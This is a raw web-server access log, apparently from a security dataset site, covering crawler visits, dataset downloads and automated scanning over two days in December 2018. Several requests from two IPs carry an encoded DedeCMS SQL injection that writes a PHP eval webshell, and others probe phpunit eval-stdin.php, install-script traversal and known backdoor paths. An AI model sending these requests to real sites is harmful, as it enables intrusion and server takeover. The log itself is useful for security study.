54.36.148.203 - - [08/Dec/2018:02:11:40 -0800] "GET /self.logs/error.log.2018-01-07.gz HTTP/1.1" 200 3992 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
106.51.105.0 - - [08/Dec/2018:21:40:18 -0800] "GET /tg/a.zip HTTP/1.1" 200 66189337 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" 
3.17.77.122 - - [08/Dec/2018:21:44:48 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Trident/5.0 Safari/602.1" 
163.172.68.99 - - [08/Dec/2018:21:49:11 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 ((Windows; U; Windows NT 6.1; fr; rv:1.9.2) Gecko/20100115 Firefox/3.6)" 
163.172.68.99 - - [08/Dec/2018:21:49:11 -0800] "GET / HTTP/1.1" 200 12469 "-" "Mozilla/5.0 ((Windows; U; Windows NT 6.1; fr; rv:1.9.2) Gecko/20100115 Firefox/3.6)" 
54.36.148.114 - - [08/Dec/2018:21:52:45 -0800] "GET /self.logs/2015/access.log.2015-11-10.gz HTTP/1.1" 200 7557 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
106.51.105.0 - - [08/Dec/2018:21:55:23 -0800] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 23085976 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" 
185.221.190.124 - - [08/Dec/2018:22:08:57 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.0" 200 537210 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
185.44.239.182 - - [08/Dec/2018:22:10:21 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
41.223.160.138 - - [08/Dec/2018:22:11:32 -0800] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
41.223.160.138 - - [08/Dec/2018:22:14:10 -0800] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
18.224.59.51 - - [08/Dec/2018:22:14:52 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Safari/602.1" 
113.171.224.176 - - [08/Dec/2018:22:20:03 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
46.185.117.89 - - [08/Dec/2018:22:32:58 -0800] "GET / HTTP/1.1" 200 46368 "http://student.belreferatov.net/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; KKman2.0)" 
46.185.117.89 - - [08/Dec/2018:22:32:59 -0800] "GET / HTTP/1.1" 200 46368 "http://student.belreferatov.net/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; KKman2.0)" 
46.185.117.89 - - [08/Dec/2018:22:32:59 -0800] "GET / HTTP/1.1" 200 46368 "http://student.belreferatov.net/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; KKman2.0)" 
157.55.39.54 - - [08/Dec/2018:22:34:45 -0800] "GET /self.logs/error.log.2017-06-19.gz HTTP/1.1" 200 855 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.54 - - [08/Dec/2018:22:34:45 -0800] "GET /self.logs/error.log.2016-12-13.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.54 - - [08/Dec/2018:22:34:46 -0800] "GET /self.logs/error.log.2017-01-30.gz HTTP/1.1" 304 188 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
103.76.85.99 - - [08/Dec/2018:22:34:46 -0800] "GET //plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=114&arrs2[]=101&arrs2[]=97&arrs2[]=100&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=120&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=109&arrs2[]=79&arrs2[]=111&arrs2[]=110&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 HTTP/1.1" 418 584 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
103.76.85.99 - - [08/Dec/2018:22:34:47 -0800] "GET //plus/ad_js.php?aid=19 HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
157.55.39.54 - - [08/Dec/2018:22:34:47 -0800] "GET /self.logs/access.log.2016-08-07.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
103.76.85.99 - - [08/Dec/2018:22:34:47 -0800] "GET //plus/read.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
103.76.85.99 - - [08/Dec/2018:22:34:48 -0800] "POST //include/dialog/select_soft_post.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
103.76.85.99 - - [08/Dec/2018:22:34:48 -0800] "GET //data/cache/asd.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
103.76.85.99 - - [08/Dec/2018:22:34:49 -0800] "GET //install/index.php.bak?step=11&insLockfile=a&s_lang=x&install_demo_name=../data/admin/config_update.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
103.76.85.99 - - [08/Dec/2018:22:34:49 -0800] "POST //vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
103.76.85.99 - - [08/Dec/2018:22:34:50 -0800] "GET //vendor/phpunit/phpunit/src/Util/PHP/asd.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
103.76.85.99 - - [08/Dec/2018:22:34:50 -0800] "POST //index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
103.76.85.99 - - [08/Dec/2018:22:34:50 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
3.16.180.129 - - [08/Dec/2018:22:35:09 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Trident/5.0 Safari/602.1" 
3.17.16.97 - - [08/Dec/2018:22:35:13 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Safari/602.1" 
163.172.8.158 - - [08/Dec/2018:22:35:52 -0800] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36" 
180.163.220.68 - - [08/Dec/2018:22:39:50 -0800] "GET / HTTP/1.1" 200 12414 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
180.163.220.3 - - [08/Dec/2018:22:39:59 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7372 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
180.163.220.3 - - [08/Dec/2018:22:39:59 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27732 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
180.163.220.4 - - [08/Dec/2018:22:40:18 -0800] "GET / HTTP/1.1" 301 427 "-" "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-CN; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 OPR/11.2.3.102637 Mobile Safari/537.36" 
180.163.220.66 - - [08/Dec/2018:22:40:19 -0800] "GET / HTTP/1.1" 200 12414 "-" "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-CN; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 OPR/11.2.3.102637 Mobile Safari/537.36" 
180.163.220.5 - - [08/Dec/2018:22:40:37 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27732 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-CN; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 OPR/11.2.3.102637 Mobile Safari/537.36" 
180.163.220.4 - - [08/Dec/2018:22:40:40 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7372 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-CN; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 OPR/11.2.3.102637 Mobile Safari/537.36" 
75.49.251.129 - - [08/Dec/2018:22:42:54 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1" 
75.49.251.129 - - [08/Dec/2018:22:42:55 -0800] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 340 "-" "MobileSafari/604.1 CFNetwork/976 Darwin/18.2.0" 
75.49.251.129 - - [08/Dec/2018:22:42:55 -0800] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 339 "-" "MobileSafari/604.1 CFNetwork/976 Darwin/18.2.0" 
75.49.251.129 - - [08/Dec/2018:22:42:55 -0800] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 339 "-" "MobileSafari/604.1 CFNetwork/976 Darwin/18.2.0" 
75.49.251.129 - - [08/Dec/2018:22:42:55 -0800] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "MobileSafari/604.1 CFNetwork/976 Darwin/18.2.0" 
75.49.251.129 - - [08/Dec/2018:22:42:55 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "MobileSafari/604.1 CFNetwork/976 Darwin/18.2.0" 
54.36.148.159 - - [08/Dec/2018:22:44:00 -0800] "GET /self.logs/access.log.2017-11-12.gz HTTP/1.1" 200 49344 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
18.224.59.51 - - [08/Dec/2018:22:45:02 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
223.72.45.169 - - [08/Dec/2018:23:02:04 -0800] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0" 
123.125.125.181 - - [08/Dec/2018:23:04:26 -0800] "GET /self.logs/access.log.2018-11-30.gz HTTP/1.1" 200 22048 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E198 Safari/601.1" 
123.125.125.181 - - [08/Dec/2018:23:05:00 -0800] "GET /self.logs/access.log.2018-11-30.gz HTTP/1.1" 200 22048 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E198 Safari/601.1" 
54.36.149.92 - - [08/Dec/2018:23:08:47 -0800] "GET /self.logs/2016/access.log.2016-08-04.gz HTTP/1.1" 200 14559 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
18.219.132.167 - - [08/Dec/2018:23:14:33 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Chrome/67.0.3396.79 Safari/537.36" 
54.36.149.16 - - [08/Dec/2018:23:15:03 -0800] "GET /Datasets%20Description/Network/http.html HTTP/1.1" 200 1547 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
199.58.86.206 - - [08/Dec/2018:23:24:08 -0800] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.206 - - [08/Dec/2018:23:24:08 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.206 - - [08/Dec/2018:23:24:10 -0800] "GET / HTTP/1.1" 301 442 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.206 - - [08/Dec/2018:23:24:12 -0800] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.206 - - [08/Dec/2018:23:24:14 -0800] "GET / HTTP/1.1" 200 12414 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
66.249.66.82 - - [08/Dec/2018:23:28:24 -0800] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Googlebot-Image/1.0" 
113.171.224.176 - - [08/Dec/2018:23:30:07 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
18.224.136.152 - - [08/Dec/2018:23:35:09 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Trident/5.0 Chrome/67.0.3396.79 Safari/537.36" 
52.15.69.130 - - [08/Dec/2018:23:35:13 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/42.0" 
120.131.0.52 - - [08/Dec/2018:23:43:02 -0800] "GET /user.php?act=login HTTP/1.1" 404 340 "-" "python-requests/2.20.1" 
54.36.148.13 - - [08/Dec/2018:23:44:30 -0800] "GET /self.logs/2015/access.log.2015-03-19.gz HTTP/1.1" 200 3672 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
18.218.1.84 - - [08/Dec/2018:23:45:36 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
89.64.10.123 - - [08/Dec/2018:23:45:53 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36" 
89.64.10.123 - - [08/Dec/2018:23:45:54 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36" 
89.64.10.123 - - [08/Dec/2018:23:45:54 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36" 
157.55.39.194 - - [08/Dec/2018:23:50:31 -0800] "GET /Datasets%20Description/HTML_Bro_log_2/dns.html HTTP/1.1" 200 1725 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.149.73 - - [08/Dec/2018:23:52:03 -0800] "GET /self.logs/error.log.2017-01-15.gz HTTP/1.1" 200 760 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
54.36.149.2 - - [08/Dec/2018:23:52:22 -0800] "GET /self.logs/error.log.2016-04-12.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
54.36.148.121 - - [08/Dec/2018:23:52:49 -0800] "GET /self.logs/access.log.2015-06-01.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
210.35.92.98 - - [09/Dec/2018:00:08:54 -0800] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
18.219.24.122 - - [09/Dec/2018:00:14:31 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/602.1" 
194.33.70.101 - - [09/Dec/2018:00:18:35 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1" 
194.33.70.101 - - [09/Dec/2018:00:18:36 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1" 
194.33.70.101 - - [09/Dec/2018:00:18:36 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1" 
194.33.70.101 - - [09/Dec/2018:00:18:39 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1" 
120.92.92.98 - - [09/Dec/2018:00:21:01 -0800] "GET /data/%236Ik1Qv.asa HTTP/1.1" 301 515 "-" "python-requests/2.20.1" 
120.92.92.98 - - [09/Dec/2018:00:21:01 -0800] "GET /data/ HTTP/1.1" 404 340 "-" "python-requests/2.20.1" 
120.92.92.98 - - [09/Dec/2018:00:21:02 -0800] "GET /data/%23data.asp HTTP/1.1" 301 506 "-" "python-requests/2.20.1" 
120.92.92.98 - - [09/Dec/2018:00:21:02 -0800] "GET /data/ HTTP/1.1" 404 340 "-" "python-requests/2.20.1" 
120.92.92.98 - - [09/Dec/2018:00:21:03 -0800] "GET /data/%23aspcms252.asp HTTP/1.1" 301 518 "-" "python-requests/2.20.1" 
120.92.92.98 - - [09/Dec/2018:00:21:03 -0800] "GET /data/ HTTP/1.1" 404 340 "-" "python-requests/2.20.1" 
120.92.92.98 - - [09/Dec/2018:00:21:04 -0800] "GET /data/%235Dp8Gh.asp HTTP/1.1" 301 515 "-" "python-requests/2.20.1" 
120.92.92.98 - - [09/Dec/2018:00:21:04 -0800] "GET /data/ HTTP/1.1" 404 340 "-" "python-requests/2.20.1" 
120.92.92.98 - - [09/Dec/2018:00:21:05 -0800] "POST /include/dialog/select_soft_post.php HTTP/1.1" 301 545 "-" "python-requests/2.20.1" 
120.92.92.98 - - [09/Dec/2018:00:21:05 -0800] "GET /include/dialog/select_soft_post.php HTTP/1.1" 404 340 "-" "python-requests/2.20.1" 
120.92.92.98 - - [09/Dec/2018:00:21:05 -0800] "GET /plus/saohwzdnoafz.php HTTP/1.1" 301 522 "-" "python-requests/2.20.1" 
120.92.92.98 - - [09/Dec/2018:00:21:06 -0800] "GET /plus/saohwzdnoafz.php HTTP/1.1" 404 340 "-" "python-requests/2.20.1" 
120.92.92.98 - - [09/Dec/2018:00:21:08 -0800] "GET /plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=114&arrs2[]=101&arrs2[]=97&arrs2[]=100&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=120&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=109&arrs2[]=79&arrs2[]=111&arrs2[]=110&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 HTTP/1.1" 418 584 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
120.92.92.98 - - [09/Dec/2018:00:21:08 -0800] "GET /plus/ad_js.php?aid=19 HTTP/1.1" 301 524 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
120.92.92.98 - - [09/Dec/2018:00:21:09 -0800] "GET /plus/ad_js.php?aid=19 HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
120.92.92.98 - - [09/Dec/2018:00:21:09 -0800] "GET /plus/read.php HTTP/1.1" 301 506 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
